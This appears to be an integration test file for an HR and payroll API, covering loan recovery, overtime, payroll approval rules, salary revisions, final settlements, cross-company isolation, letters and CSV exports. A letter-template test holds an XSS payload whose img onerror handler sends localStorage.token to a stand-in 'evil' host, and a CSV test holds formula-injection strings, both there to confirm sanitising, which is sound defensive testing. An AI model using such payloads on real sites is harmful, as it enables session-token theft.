    const loan = (await call('hr', 'POST', '/records/loan', { data: { employee, type: 'loan', amount: RS(amountRs), installments, firstDeduction } })).json()
    await call('ceo', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })
    expect((await call('mgmt', 'POST', `/records/loan/${loan.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
    return loan.id as string
  }
  // Raised by the CEO; the HOD step (no manager) by HR, the HR step by management.
  const approvedByChain = async (section: string, data: Record<string, unknown>) => {
    const r = (await call('ceo', 'POST', `/records/${section}`, { data })).json()
    await call('hr', 'POST', `/records/${section}/${r.id}/decide`, { decision: 'approved' })
    const done = (await call('mgmt', 'POST', `/records/${section}/${r.id}/decide`, { decision: 'approved' })).json()
    expect(done.status).toBe('approved')
    return done
  }
  const approvedRevision = async (employee: string, grossRs: number, effectiveDate: string) => {
    const rev = (await call('hr', 'POST', '/records/salary_revision', { data: { employee, revisedGross: RS(grossRs), effectiveDate } })).json()
    await call('ceo', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })
    expect((await call('mgmt', 'POST', `/records/salary_revision/${rev.id}/decide`, { decision: 'approved' })).json().status).toBe('approved')
    return rev.id as string
  }

  it('recovers a loan once across months even while last month is unlocked, pays late OT once, and splits an edited loan total', async () => {
    const lee = await newEmployee('Loan Taker', 52000)
    const loanA = await approvedLoan(lee, 20000, 2, '2027-05-01')
    const loanB = await approvedLoan(lee, 6000, 3, '2027-06-01')
    // OT worked in October 2026, approved long after — no run has paid it.
    const ot = await approvedByChain('overtime', { employee: lee, date: '2026-10-15', otHours: 2 })

    const may = (await call('hr', 'POST', '/payroll/runs', { period: '2027-05' })).json()
    const june = (await call('hr', 'POST', '/payroll/runs', { period: '2027-06' })).json()
    const maySlip = await slipOf(may.id, lee)
    const juneSlip = await slipOf(june.id, lee)
    // May (still a draft) takes the first 10,000; June must not take all 20,000.
    expect(maySlip.inputs.loans).toEqual([{ loanId: loanA, cents: RS(10000) }])
    expect(juneSlip.inputs.loans).toEqual([{ loanId: loanA, cents: RS(10000) }, { loanId: loanB, cents: RS(2000) }])
    expect(juneSlip.inputs.loanInstallmentsCents).toBe(RS(12000))
    // The late OT is on May, and only May.
    expect(maySlip.inputs.otRecordIds).toContain(ot.id)
    expect(maySlip.inputs.otCents).toBeGreaterThanOrEqual(ot.amountCents)
    expect(juneSlip.inputs.otRecordIds).not.toContain(ot.id)

    // An edited total is spread oldest first up to what each loan still owes.
    const up = await call('hr', 'PATCH', `/payroll/payslips/${juneSlip.id}`, { loanInstallmentsCents: RS(14000) })
    expect(up.statusCode).toBe(200)
    expect(up.json().inputs.loans).toEqual([{ loanId: loanA, cents: RS(10000) }, { loanId: loanB, cents: RS(4000) }])
    const over = await call('hr', 'PATCH', `/payroll/payslips/${juneSlip.id}`, { loanInstallmentsCents: RS(16001) })
    expect(over.statusCode).toBe(400)
    expect(over.json().error.code).toBe('LOAN_OVER_OUTSTANDING')
    const bossSlip = await slipOf(june.id, bossEmp)
    expect((await call('hr', 'PATCH', `/payroll/payslips/${bossSlip.id}`, { loanInstallmentsCents: RS(5000) })).statusCode).toBe(400)

    // New OT hours are paid at the OT rate, unless the amount is typed too.
    const hours = (await call('hr', 'PATCH', `/payroll/payslips/${juneSlip.id}`, { otHours: 4 })).json()
    expect(hours.inputs.otCents).toBe(overtimeCents(4, RS(52000), DEFAULT_HR_SETTINGS))
    expect(hours.lines.find((l: { code: string }) => l.code === 'overtime').amountCents).toBe(RS(2000))
    const both = (await call('hr', 'PATCH', `/payroll/payslips/${juneSlip.id}`, { otHours: 5, otCents: RS(100) })).json()
    expect(both.inputs.otCents).toBe(RS(100))

    for (const r of [may, june]) expect((await call('hr', 'DELETE', `/payroll/runs/${r.id}`)).statusCode).toBe(204)
  })

  it('keeps whoever edits or recalculates a payroll from approving it, and refuses changes once approved', async () => {
    const run = (await call('hr', 'POST', '/payroll/runs', { period: '2027-05' })).json()
    const slip = await slipOf(run.id, cookEmp)
    // Management edits a payslip on HR's run, then tries to approve it.
    expect((await call('mgmt', 'PATCH', `/payroll/payslips/${slip.id}`, { earningAdjustmentsCents: RS(200000) })).statusCode).toBe(200)
    const self = await call('mgmt', 'POST', `/payroll/runs/${run.id}/approve`)
    expect(self.statusCode).toBe(403)
    // Recalculating counts too — and it replaced the edit.
    expect((await call('mgmt', 'POST', `/payroll/runs/${run.id}/recalculate`)).statusCode).toBe(200)
    expect((await call('mgmt', 'POST', `/payroll/runs/${run.id}/approve`)).statusCode).toBe(403)
    expect((await prisma.hrPayrollRun.findUniqueOrThrow({ where: { id: run.id } })).preparedByIds).toEqual(expect.arrayContaining([users['hr']!.id, users['mgmt']!.id]))
    expect((await call('ceo', 'POST', `/payroll/runs/${run.id}/approve`)).statusCode).toBe(200)
    // Approved: neither an edit nor a recalculation lands.
    const fresh = await slipOf(run.id, cookEmp)
    const late = await call('hr', 'PATCH', `/payroll/payslips/${fresh.id}`, { earningAdjustmentsCents: RS(1) })
    expect(late.statusCode).toBe(409)
    expect((await call('hr', 'POST', `/payroll/runs/${run.id}/recalculate`)).statusCode).toBe(409)
    expect((await slipOf(run.id, cookEmp)).inputs.earningAdjustmentsCents).toBe(0)

    // A recalculation racing an approval never rewrites an approved run.
    await call('ceo', 'POST', `/payroll/runs/${run.id}/reopen`)
    const [recalc, approve] = await Promise.all([
      call('hr', 'POST', `/payroll/runs/${run.id}/recalculate`),
      call('ceo', 'POST', `/payroll/runs/${run.id}/approve`),
    ])
    expect(approve.statusCode).toBe(200)
    expect([200, 409]).toContain(recalc.statusCode)
    const after = (await call('hr', 'GET', `/payroll/runs/${run.id}`)).json()
    expect(after.run.status).toBe('approved')
    expect(after.payslips.length).toBe(after.run.totals.employees)
    await call('ceo', 'POST', `/payroll/runs/${run.id}/reopen`)
    expect((await call('hr', 'DELETE', `/payroll/runs/${run.id}`)).statusCode).toBe(204)
  })

  it('will not approve or lock a payroll with EOBI uncalculated, and an edit does not hide the warning', async () => {
    const good = { ...DEFAULT_HR_SETTINGS, eobi: { employeePct: 1, employerPct: 5, base: 'fixed', fixedWageCents: RS(40000) } }
    await call('hr', 'PUT', '/settings', { ...good, eobi: { ...good.eobi, fixedWageCents: null } })
    try {
      const run = (await call('hr', 'POST', '/payroll/runs', { period: '2027-05' })).json()
      expect(run.totals.warnings).toContain(EOBI_NOT_CALCULATED)
      const slip = await slipOf(run.id, cookEmp)
      await call('hr', 'PATCH', `/payroll/payslips/${slip.id}`, { absentDays: 1 })
      expect((await call('hr', 'GET', `/payroll/runs/${run.id}`)).json().run.totals.warnings).toContain(EOBI_NOT_CALCULATED)
      const refused = await call('ceo', 'POST', `/payroll/runs/${run.id}/approve`)
      expect(refused.statusCode).toBe(409)
      expect(refused.json().error.code).toBe('RUN_INCOMPLETE')
      // Set the base and recalculate: it goes through.
      await call('hr', 'PUT', '/settings', good)
      await call('hr', 'POST', `/payroll/runs/${run.id}/recalculate`)
      expect((await call('ceo', 'POST', `/payroll/runs/${run.id}/approve`)).statusCode).toBe(200)
      await call('ceo', 'POST', `/payroll/runs/${run.id}/reopen`)
      expect((await call('hr', 'DELETE', `/payroll/runs/${run.id}`)).statusCode).toBe(204)
    } finally {
      await call('hr', 'PUT', '/settings', good)
    }
  })

  it('pays each month at its own salary, and never applies a future revision early', async () => {
    const rae = await newEmployee('Revised Server', 50000)
    await approvedRevision(rae, 70000, '2026-08-01')
    expect((await prisma.hrEmployee.findUniqueOrThrow({ where: { id: rae } })).grossSalaryCents).toBe(RS(70000))
    // July, paid after the August revision was applied, is paid at July's salary.
    const july = (await call('hr', 'POST', '/payroll/runs', { period: '2026-07' })).json()
    expect((await slipOf(july.id, rae)).grossCents).toBe(RS(50000))
    expect((await call('hr', 'DELETE', `/payroll/runs/${july.id}`)).statusCode).toBe(204)

    // A run for a later month counts the revision due in it — without applying it.
    const future = await approvedRevision(rae, 90000, '2099-03-01')
    const mar = (await call('hr', 'POST', '/payroll/runs', { period: '2099-03' })).json()
    const feb = (await call('hr', 'POST', '/payroll/runs', { period: '2099-02' })).json()
    expect((await slipOf(mar.id, rae)).grossCents).toBe(RS(90000))
    expect((await slipOf(feb.id, rae)).grossCents).toBe(RS(70000))
    expect((await prisma.hrEmployee.findUniqueOrThrow({ where: { id: rae } })).grossSalaryCents).toBe(RS(70000))
    expect((await prisma.hrRecord.findUniqueOrThrow({ where: { id: future } })).appliedAt).toBeNull()
    for (const r of [mar, feb]) expect((await call('hr', 'DELETE', `/payroll/runs/${r.id}`)).statusCode).toBe(204)

    // A backdated revision approved after the August one keeps to its own months.
    await approvedRevision(rae, 60000, '2026-06-01')
    const emp = await prisma.hrEmployee.findUniqueOrThrow({ where: { id: rae } })
    expect(emp.grossSalaryCents).toBe(RS(70000))
    expect(await salaryForPeriod(emp, '2026-05')).toBe(RS(50000))
    expect(await salaryForPeriod(emp, '2026-06')).toBe(RS(60000))
    expect(await salaryForPeriod(emp, '2026-08')).toBe(RS(70000))
  })

  it('moves the probation end as soon as an extension is approved', async () => {
    const pat = await newEmployee('New Hire', 40000, { employmentType: 'probation', probationEnd: '2026-01-31' })
    await approvedByChain('probation_review', { employee: pat, outcome: 'extend', extendTo: '2099-12-31' })
    const e = await prisma.hrEmployee.findUniqueOrThrow({ where: { id: pat } })
    expect(e.probationEnd?.toISOString().slice(0, 10)).toBe('2099-12-31')
  })

  it('settles a leaver from where payroll left off, and payroll then leaves them out', async () => {
    const zed = await newEmployee('Leaving Cook', 60000)
    await approvedLoan(zed, 12000, 3, '2027-07-01')
    const julyOt = await approvedByChain('overtime', { employee: zed, date: '2027-07-20', otHours: 2 })
    const july = (await call('hr', 'POST', '/payroll/runs', { period: '2027-07' })).json()
    expect((await slipOf(july.id, zed)).inputs.otRecordIds).toContain(julyOt.id)
    expect((await call('ceo', 'POST', `/payroll/runs/${july.id}/approve`)).statusCode).toBe(200)
    expect((await call('ceo', 'POST', `/payroll/runs/${july.id}/lock`)).statusCode).toBe(200)
    const augOt = await approvedByChain('overtime', { employee: zed, date: '2027-08-05', otHours: 3 })
    // A revision already due that no page has applied yet.
    await prisma.hrRecord.create({ data: { tenantId, section: 'salary_revision', formVersion: 0, employeeId: zed, status: 'approved', amountCents: RS(70000), effectiveDate: new Date('2026-09-01'), data: {} } })

    const ff = (await call('hr', 'POST', '/final-settlement/calculate', { employeeId: zed, lastWorkingDay: '2027-08-10' })).json()
    expect(ff.paidThrough).toBe('2027-07')
    expect(ff.salaryPayable).toBe(Math.round(RS(70000) * 10 / 31)) // August only, at the revised salary
    expect(ff.otPayable).toBe(augOt.amountCents)                    // July's OT went on July's payroll
    expect(ff.loanRecovery).toBe(RS(8000))                          // 4,000 came off in July
    // Now approved, the August payroll does not pay them again — and one
    // calculated before the approval can't be approved until recalculated.
    const aug = (await call('hr', 'POST', '/payroll/runs', { period: '2027-08' })).json()
    expect(await slipOf(aug.id, zed)).toBeDefined()
    await prisma.hrRecord.create({ data: { tenantId, section: 'final_settlement', formVersion: 0, employeeId: zed, status: 'approved', endDate: new Date('2027-08-10'), amountCents: ff.netAmount, data: {} } })
    const stale = await call('ceo', 'POST', `/payroll/runs/${aug.id}/approve`)
    expect(stale.statusCode).toBe(409)
    expect(stale.json().error.message).toMatch(/full & final/)
    await call('hr', 'POST', `/payroll/runs/${aug.id}/recalculate`)
    expect(await slipOf(aug.id, zed)).toBeUndefined()
    expect((await call('hr', 'DELETE', `/payroll/runs/${aug.id}`)).statusCode).toBe(204)
  })

  it('encashes only the leave a short-serving leaver has earned', async () => {
    const brief = await newEmployee('Brief Stay', 52000, { joiningDate: '2026-09-01' })
    const ff = (await call('hr', 'POST', '/final-settlement/calculate', { employeeId: brief, lastWorkingDay: '2026-09-30' })).json()
    const paid = (await leaveBalancesFor(tenantId, brief, new Date('2026-09-30'))).filter((b) => b.paid)
    const fullYear = paid.reduce((a, b) => a + b.entitlement, 0)
    // One month of the year's entitlement, not the year's.
    expect(ff.leaveBalanceDays).toBeCloseTo(fullYear / 12, 1)
    expect(ff.leaveEncashment).toBe(Math.round(ff.leaveBalanceDays * RS(52000) / 26))
  })

  // ── formats, references, lookups, letters ─────────────────────────────────

  /** A second company, with an employee (and a designation) of its own. */
  const otherCompany = async (name: string) => {
    const t = await prisma.tenant.create({ data: { name, slug: `hr-other-${Date.now()}-${Math.random().toString(36).slice(2, 6)}` } })
    const unit = await prisma.hrOrgUnit.create({ data: { tenantId: t.id, kind: 'designation', name: 'Barista' } })
    const emp = await prisma.hrEmployee.create({ data: { tenantId: t.id, employeeCode: 'B-0001', fullName: 'Other Co Barista', designationId: unit.id, joiningDate: new Date('2024-03-01') } })
    const cleanup = async () => {
      await prisma.hrLetterTemplate.deleteMany({ where: { tenantId: t.id } })
      await prisma.hrRecord.deleteMany({ where: { tenantId: t.id } })
      await prisma.hrEmployee.deleteMany({ where: { tenantId: t.id } })
      await prisma.hrOrgUnit.deleteMany({ where: { tenantId: t.id } })
      await prisma.auditLog.deleteMany({ where: { tenantId: t.id } }).catch(() => {})
      await prisma.tenantMember.deleteMany({ where: { tenantId: t.id } }).catch(() => {})
      await prisma.tenant.delete({ where: { id: t.id } })
    }
    return { tenant: t, emp, unit, cleanup }
  }

  it('refuses another company\'s id in a record, and a format that would let one through as text', async () => {
    const b = await otherCompany('Other Co Refs')
    try {
      // Straight through the default format: the employee is checked.
      const rev = await call('hr', 'POST', '/records/salary_revision', { data: { employee: b.emp.id, revisedGross: RS(90000), effectiveDate: '2099-01-01' } })
      expect(rev.statusCode).toBe(422)
      expect(rev.json().error.code).toBe('BAD_REFERENCE')
      // …and a format cannot re-type the field to dodge the check.
      const fields = sectionByKey('salary_revision')!.fields!.map((f) => (f.key === 'employee' ? { ...f, type: 'text' } : f))
      const retyped = await call('hr', 'PUT', '/forms/salary_revision', { fields })
      expect(retyped.statusCode).toBe(400)
      expect(retyped.json().error.message).toMatch(/employeeId/)
      const master = EMPLOYEE_MASTER_FIELDS.map((f) => (f.key === 'managerId' ? { ...f, type: 'text' } : f))
      expect((await call('hr', 'PUT', '/forms/employees', { fields: master })).statusCode).toBe(400)
      // A format saved before the rule still has its id columns checked.
      await prisma.hrFormDefinition.create({ data: { tenantId, section: 'employees', version: 91, title: 'Employee master', fields: master as never, isActive: false } })
      await prisma.hrFormDefinition.updateMany({ where: { tenantId, section: 'employees' }, data: { isActive: false } })
      await prisma.hrFormDefinition.updateMany({ where: { tenantId, section: 'employees', version: 91 }, data: { isActive: true } })
      try {
        const moved = await call('hr', 'PATCH', `/employees/${cookEmp}`, { data: { managerId: b.emp.id } })
        expect(moved.statusCode).toBe(422)
        expect((await prisma.hrEmployee.findUniqueOrThrow({ where: { id: cookEmp } })).managerId).toBe(bossEmp)
        // Nor can that version be made live again through the API.
        expect((await call('hr', 'POST', '/forms/employees/activate', { version: 91 })).statusCode).toBe(400)
      } finally {
        await call('hr', 'POST', '/forms/employees/activate', { version: 0 })
      }
    } finally {
      await b.cleanup()
    }
  })

  it('refuses a loan with no whole installments, whatever its format says', async () => {
    for (const installments of [0, -1, 1.5]) {
      const r = await call('hr', 'POST', '/records/loan', { data: { employee: cookEmp, type: 'loan', amount: RS(50000), installments, firstDeduction: '2099-01-01' } })
      expect(r.statusCode, String(installments)).toBe(400)
    }
    // A format without the whole-number rule does not get round it.
    const loose = sectionByKey('loan')!.fields!.map((f) => (f.key === 'installments' ? { ...f, integer: undefined, min: undefined } : f))
    expect((await call('hr', 'PUT', '/forms/loan', { fields: loose })).statusCode).toBe(200)
    try {
      const r = await call('hr', 'POST', '/records/loan', { data: { employee: cookEmp, type: 'loan', amount: RS(50000), installments: 0, firstDeduction: '2099-01-01' } })
      expect(r.statusCode).toBe(400)
      expect(r.json().error.code).toBe('BAD_INSTALLMENTS')
    } finally {
      await call('hr', 'POST', '/forms/loan/activate', { version: 0 })
    }
  })

  it('refuses an employee with no name, even when the format leaves the name optional', async () => {
    const optional = EMPLOYEE_MASTER_FIELDS.map((f) => (f.key === 'fullName' ? { ...f, required: false } : f))
    expect((await call('hr', 'PUT', '/forms/employees', { fields: optional })).statusCode).toBe(200)
    try {
      for (const data of [{}, { fullName: '   ' }]) {
        const r = await call('hr', 'POST', '/employees', { data })
        expect(r.statusCode).toBe(400)
        expect(r.json().error.message).toMatch(/name is required/)
      }
      expect(await prisma.hrEmployee.count({ where: { tenantId, fullName: 'undefined' } })).toBe(0)
    } finally {
      await call('hr', 'POST', '/forms/employees/activate', { version: 0 })
    }
  })

  it('refuses a date that does not exist rather than rolling it into the next month', async () => {
    const r = await call('cook', 'POST', '/me/records/leave', { data: { leaveType: annual, from: '2026-06-29', to: '2026-06-31' } })
    expect(r.statusCode).toBe(400)
    expect(r.json().error.message).toMatch(/real date/)
  })

  it('gives staff outside HR only the settings their self-service forms pick from', async () => {
    const cand = (await call('hr', 'POST', '/records/candidate', { data: { name: 'Ayesha Khan', phone: '03001112222', availableFrom: '2026-10-01' } })).json()
    const hr = (await call('hr', 'GET', '/lookups')).json()
    expect(hr.records.candidate.map((r: { id: string }) => r.id)).toContain(cand.id)
    const cook = (await call('cook', 'GET', '/lookups')).json()
    expect(cook.records.leave_type.length).toBeGreaterThan(0)
    for (const hidden of ['candidate', 'requisition', 'job_opening', 'interview', 'offer']) expect(cook.records[hidden], hidden).toBeUndefined()
    expect(JSON.stringify(cook)).not.toMatch(/Ayesha/)
    // Even when a self-service format points at an HR-only section.
    const trFields = [...sectionByKey('training_request')!.fields!, { key: 'relatedCandidate', label: 'Related candidate', type: 'record', ref: 'candidate' }]
    expect((await call('hr', 'PUT', '/forms/training_request', { fields: trFields })).statusCode).toBe(200)
    try {
      expect((await call('cook', 'GET', '/lookups')).json().records.candidate).toBeUndefined()
    } finally {
      await call('hr', 'POST', '/forms/training_request/activate', { version: 0 })
    }
  })

  it('reads pickers and formats for the employee\'s own company, and only a company the caller belongs to', async () => {
    const b = await otherCompany('Other Co Pickers')
    const leaveType = await prisma.hrRecord.create({ data: { tenantId: b.tenant.id, section: 'leave_type', formVersion: 0, status: 'approved', category: 'paid', data: { name: 'Other Co Annual', entitlementDays: 10, pay: 'paid' } } })
    // A login whose company is this one, with an employee record in the other.
    await mkUser('farcook', 'kitchen')
    await prisma.hrEmployee.create({ data: { tenantId: b.tenant.id, employeeCode: 'B-0009', fullName: 'Other Co Cook', userId: users['farcook']!.id, joiningDate: new Date('2024-01-01') } })
    try {
      // HR is not a member of the other company: its lists and formats are refused.
      expect((await call('hr', 'GET', `/lookups?tenantId=${b.tenant.id}`)).statusCode).toBe(403)
      expect((await call('hr', 'GET', `/org?tenantId=${b.tenant.id}`)).statusCode).toBe(403)
      expect((await call('hr', 'GET', `/forms/employees?tenantId=${b.tenant.id}`)).statusCode).toBe(403)
      // Once a member, the profile of that company's employee reads that company's lists.
      await prisma.tenantMember.create({ data: { tenantId: b.tenant.id, userId: users['hr']!.id } as never })
      const lk = (await call('hr', 'GET', `/lookups?tenantId=${b.tenant.id}`)).json()
      expect(lk.employees.map((e: { fullName: string }) => e.fullName)).toContain('Other Co Barista')
      expect(lk.employees.map((e: { fullName: string }) => e.fullName)).not.toContain('Line Cook')
      const org = (await call('hr', 'GET', `/org?tenantId=${b.tenant.id}`)).json()
      expect(org.units.map((u: { id: string }) => u.id)).toEqual([b.unit.id])
      expect((await call('hr', 'GET', `/forms/employees?tenantId=${b.tenant.id}`)).statusCode).toBe(200)
      // Self-service: the employee's company comes with /me, and its leave
      // types are what the request form offers — not the login's company's.
      const me = (await call('farcook', 'GET', '/me')).json()
      expect(me.tenantId).toBe(b.tenant.id)
      const own = (await call('farcook', 'GET', `/lookups?tenantId=${me.tenantId}`))
      expect(own.statusCode).toBe(200)
      expect(own.json().records.leave_type.map((r: { id: string }) => r.id)).toEqual([leaveType.id])
      expect(JSON.stringify(own.json())).not.toMatch(/"label":"Annual"/) // this company's "Annual" is not offered
      expect((await call('farcook', 'GET', `/org?tenantId=${me.tenantId}`)).statusCode).toBe(200)
      // Any other company is refused.
      const c = await otherCompany('Other Co Stranger')
      try {
        expect((await call('farcook', 'GET', `/lookups?tenantId=${c.tenant.id}`)).statusCode).toBe(403)
      } finally {
        await c.cleanup()
      }
    } finally {
      await b.cleanup()
    }
  })

  it('says whose format a record list carries, and serves each record the version it was saved under', async () => {
    const leave = (await call('hr', 'GET', `/records/leave?employeeId=${cookEmp}`)).json()
    expect(leave.formatTenantId).toBe(tenantId)
    const rec = leave.records[0]
    const fields = [...sectionByKey('leave')!.fields!, { key: 'coverNote', label: 'Cover note', type: 'text' }]
    const saved = await call('hr', 'PUT', '/forms/leave', { fields })
    expect(saved.statusCode).toBe(200)
    try {
      const list = (await call('hr', 'GET', `/records/leave?employeeId=${cookEmp}`)).json()
      expect(list.format.version).toBe(saved.json().version)
      expect(list.format.version).not.toBe(rec.formVersion)
      const own = (await call('hr', 'GET', `/records/leave/${rec.id}`)).json()
      expect(own.format.version).toBe(rec.formVersion)
      expect(own.format.fields.map((f: { key: string }) => f.key)).not.toContain('coverNote')
    } finally {
      await call('hr', 'POST', '/forms/leave/activate', { version: 0 })
    }
  })

  it('stores letter templates as formatting only, and prints them that way', async () => {
    const saved = await call('hr', 'PUT', '/letters/warning_letter', {
      title: 'Warning', body: '<p>Dear {{employee.fullName}}</p><img src=x onerror="fetch(\'https://evil/\'+localStorage.token)"><script>alert(1)</script>',
    })
    expect(saved.statusCode).toBe(200)
    expect(saved.json().body).toBe('<p>Dear {{employee.fullName}}</p><img>')
    // A template stored before sanitising is cleaned when it is printed.
    await prisma.hrLetterTemplate.update({ where: { tenantId_key: { tenantId, key: 'warning_letter' } }, data: { body: '<p onclick="x()">Dear {{employee.fullName}}</p><svg onload=alert(1)></svg>' } })
    try {
      const r = (await call('hr', 'POST', '/letters/render', { key: 'warning_letter', employeeId: cookEmp })).json()
      expect(r.html).toBe('<p>Dear Line Cook</p>')
    } finally {
      await call('hr', 'DELETE', '/letters/warning_letter')
    }
  })

  it('issues a letter for another company\'s employee under that company, with its template and names', async () => {
    const b = await otherCompany('Other Co Letters')
    await prisma.tenantMember.create({ data: { tenantId: b.tenant.id, userId: users['hr']!.id } as never })
    await prisma.hrLetterTemplate.create({ data: { tenantId: b.tenant.id, key: 'experience_letter', title: 'Other experience', body: '<p>Other Co format: {{employee.fullName}}, {{employee.designation}}, {{company.name}}</p>' } })
    try {
      const r = await call('hr', 'POST', '/letters/render', { key: 'experience_letter', employeeId: b.emp.id })
      expect(r.statusCode).toBe(200)
      expect(r.json().title).toBe('Other experience')
      expect(r.json().html).toBe('<p>Other Co format: Other Co Barista, Barista, Other Co Letters</p>')
      expect(r.json().html).not.toMatch(/HR Test Co/)
      // A record of one company with an employee of the other is refused.
      const leave = (await call('hr', 'GET', `/records/leave?employeeId=${cookEmp}`)).json().records[0]
      expect((await call('hr', 'POST', '/letters/render', { key: 'experience_letter', employeeId: b.emp.id, recordId: leave.id })).statusCode).toBe(422)
    } finally {
      await b.cleanup()
    }
  })

  // ── reports, dashboard, CSV ───────────────────────────────────────────────

  it('keeps plain numbers — negative ones too — numeric in a CSV, and still defuses a formula', () => {
    expect(csv([[-1500, '-1500.00', '-2', 12.5, 0]])).toBe('-1500,-1500.00,-2,12.5,0')
    expect(csv([['=SUM(A1:A9)', '+1-2', '-x', '@me', '\tcmd']])).toBe("'=SUM(A1:A9),'+1-2,'-x,'@me,'\tcmd")
    expect(csv([['\r=1']])).toBe(`"'\r=1"`)
  })

  it('names each company\'s designations and managers in a portfolio report, not just the active company\'s', async () => {
    const b = await otherCompany('Other Co Portfolio')
    await prisma.tenantMember.create({ data: { tenantId: b.tenant.id, userId: users['hr']!.id } as never })
    await prisma.hrEmployee.create({ data: { tenantId: b.tenant.id, employeeCode: 'B-0002', fullName: 'Other Co Runner', managerId: b.emp.id, designationId: b.unit.id, joiningDate: new Date('2024-05-01') } })
    const portfolio = (url: string) => app.inject({ method: 'GET', url: `/hr${url}`, headers: { authorization: `Bearer ${users['hr']!.token}`, 'x-servd-portfolio': '1' } })
    try {
      const master = (await portfolio('/reports/employee_master')).json()
      const at = (name: string) => master.rows.find((r: unknown[]) => r[1] === name)
      expect(at('Other Co Barista')[master.header.indexOf('Designation')]).toBe('Barista')
      expect(at('Other Co Runner')[master.header.indexOf('Manager')]).toBe('Other Co Barista')
      expect(at('Line Cook')[master.header.indexOf('Manager')]).toBe('Head Chef')
      const hc = (await portfolio('/reports/headcount?asOf=2026-09-01')).json()
      expect(hc.rows.find((r: unknown[]) => r[2] === 'Barista')?.[4]).toBe(2)
      const list = (await portfolio('/employees')).json() as Array<{ fullName: string; designation: string | null; manager: string | null }>
      expect(list.find((e) => e.fullName === 'Other Co Runner')).toMatchObject({ designation: 'Barista', manager: 'Other Co Barista' })
    } finally {
      await b.cleanup()
    }
  })

  it('exports record money in rupees and references by name', async () => {
    const file = await call('hr', 'GET', '/records/overtime/export.csv')
    expect(file.statusCode).toBe(200)
    // The payroll test's approved OT: 3 h, Rs 1,500 — stored as 150000 paisa.
    const line = file.body.split('\n').find((l: string) => l.includes('2026-09-10'))!
    expect(line).toMatch(/,1500\.00,/)
    expect(line).not.toMatch(/,150000,/)
    expect(line).not.toContain(cookEmp)
    expect(line.match(/Line Cook/g)).toHaveLength(2) // the Employee column and the form's employee field
  })

  it('counts headcount on a last working day, and drops staff marked gone without one once their status changed', async () => {
    const total = async (q: string) => { const rows = (await call('hr', 'GET', `/reports/headcount${q}`)).json().rows as unknown[][]; return rows[rows.length - 1]!.at(-1) as number }
    const may = async () => (await call('hr', 'GET', '/reports/turnover?from=2026-05-01&to=2026-05-31')).json().rows[0] as unknown[]
    const made: string[] = []
    try {
      const before = await total('')
      made.push((await prisma.hrEmployee.create({ data: { tenantId, employeeCode: 'T5-0001', fullName: 'Leaving Today', joiningDate: new Date('2025-01-01'), lastWorkingDay: pktToday() } })).id)
      expect(await total('')).toBe(before + 1)

      const [on10, on11, mayBefore] = [await total('?asOf=2026-05-10'), await total('?asOf=2026-05-11'), await may()]
      made.push((await prisma.hrEmployee.create({ data: { tenantId, employeeCode: 'T5-0002', fullName: 'Terminated In Master', status: 'terminated', joiningDate: new Date('2025-01-01'), updatedAt: new Date('2026-05-10T10:00:00Z') } })).id)
      expect(await total('?asOf=2026-05-10')).toBe(on10 + 1)
      expect(await total('?asOf=2026-05-11')).toBe(on11)
      const mayAfter = await may()
      // [month, opening, joiners, leavers, closing, %]: opens with them, leaves with them.
      expect(mayAfter[1]).toBe((mayBefore[1] as number) + 1)
      expect(mayAfter[3]).toBe((mayBefore[3] as number) + 1)
      expect(mayAfter[4]).toBe(mayBefore[4])
    } finally {
      await prisma.hrEmployee.deleteMany({ where: { id: { in: made } } })
    }
  })

  it('shows the OT hours approved on the dashboard, beside the amount they were priced on', async () => {
    const dash = async () => (await call('hr', 'GET', '/dashboard')).json().overtimeThisMonth as { hours: number; amountCents: number }
    const before = await dash()
    const ot = (await call('cook', 'POST', '/me/records/overtime', { data: { date: pktToday().toISOString().slice(0, 10), otHours: 10 } })).json()
    await call('boss', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved', approvedHours: 4 })
    const final = (await call('hr', 'POST', `/records/overtime/${ot.id}/decide`, { decision: 'approved' })).json()
    expect(final.status).toBe('approved')
    const after = await dash()
    expect(after.hours).toBe(before.hours + 4)
    expect(after.amountCents).toBe(before.amountCents + final.amountCents)
  })

  it('leaves documents of people who have left, and cancelled compliance items, off the due list and dashboard', async () => {
    const soon = new Date(pktToday().getTime() + 5 * 86_400_000)
    const gone = await prisma.hrEmployee.create({ data: { tenantId, employeeCode: 'T5-0003', fullName: 'Left Last Year', status: 'resigned', joiningDate: new Date('2024-01-01'), lastWorkingDay: new Date('2025-06-30') } })
    try {
      const docsBefore = (await call('hr', 'GET', '/dashboard')).json().documentExpiry as number
      await prisma.hrDocument.create({ data: { tenantId, employeeId: gone.id, docType: 'medical', title: 'Old medical fitness', expiryDate: soon } })
      await prisma.hrDocument.create({ data: { tenantId, employeeId: cookEmp, docType: 'medical', title: 'Food handler card', expiryDate: soon } })
      expect((await call('hr', 'GET', '/dashboard')).json().documentExpiry).toBe(docsBefore + 1)
      const item = (await call('hr', 'POST', '/records/compliance_item', { data: { name: 'Trade licence', expiryDate: soon.toISOString().slice(0, 10) } })).json()
      const what = async () => ((await call('hr', 'GET', '/due')).json() as Array<{ what: string }>).map((d) => d.what)
      const due = await what()
      expect(due).toContain('Food handler card expires')
      expect(due).not.toContain('Old medical fitness expires')
      expect(due).toContain('Trade licence expires')
      expect((await call('hr', 'POST', `/records/compliance_item/${item.id}/cancel`)).statusCode).toBe(200)
      expect(await what()).not.toContain('Trade licence expires')
    } finally {
      await prisma.hrDocument.deleteMany({ where: { employeeId: { in: [gone.id, cookEmp] } } })
      await prisma.hrEmployee.delete({ where: { id: gone.id } })
    }
  })
})
